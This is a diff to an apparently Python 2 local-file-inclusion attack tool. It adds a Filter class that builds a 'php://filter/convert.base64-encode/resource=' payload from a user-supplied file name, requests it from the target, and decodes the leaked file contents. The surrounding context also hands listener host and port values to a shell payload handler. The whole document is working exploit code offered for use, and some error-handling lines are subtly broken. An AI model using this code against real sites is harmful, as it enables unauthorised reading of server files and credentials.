@@ -7,6 +7,8 @@ import sys
 import time
 import subprocess
 import requests
+import base64
+import textwrap
 
 
 t = Terminal()
@@ -254,5 +256,33 @@ class Logs:
                 else:
                     handle = Payload(lhost, lport, self.target, shell)
                     handle.handler()
+        except requests.exceptions.RequestException as expect_error:
+            print t.red(" [!] HTTP Error ")(expect_error)
+
+
+class Filter:
+
+    def __init__(self, target):
+
+        self.target = target
+
+    def execute_filter(self):
+
+        ffile = raw_input(t.green(" [*] ") + "Please Enter File To Read: ")   # filter file
+        payload = "php://filter/convert.base64-encode/resource={0}".format(ffile)
+        lfi = self.target + payload
+
+        try:
+            r = requests.get(lfi)
+            if r.status_code != 200:
+                print(t.red(" [!] Unexpected HTTP Response "))
+            else:
+                progressbar()
+                try:
+                    result = base64.b64decode(r.text)
+                    print(t.red(" [!] ") + "Decoded: " + t.red(textwrap.fill(result)))  # needs better wrapping
+                except TypeError as type_error:
+                    print(t.red(" [!] ") + "Incorrect Padding - Check File!") + type_error  # handle padding issues
+                    sys.exit(1)
         except requests.exceptions.RequestException as expect_error:
             print t.red(" [!] HTTP Error ")(expect_error)
